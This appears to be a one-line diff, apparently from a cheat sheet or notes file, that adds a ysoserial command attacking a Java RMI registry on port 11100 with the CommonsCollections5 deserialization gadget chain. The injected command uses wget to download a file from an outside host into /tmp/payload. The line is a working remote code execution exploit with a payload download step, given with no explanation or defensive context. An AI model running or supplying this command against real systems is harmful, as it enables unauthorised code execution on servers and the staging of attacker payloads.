@@ -1,0 +1,1 @@
+java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit kaibro.tw 11100 CommonsCollections5 "wget kaibro.tw/hhh -O /tmp/payload"
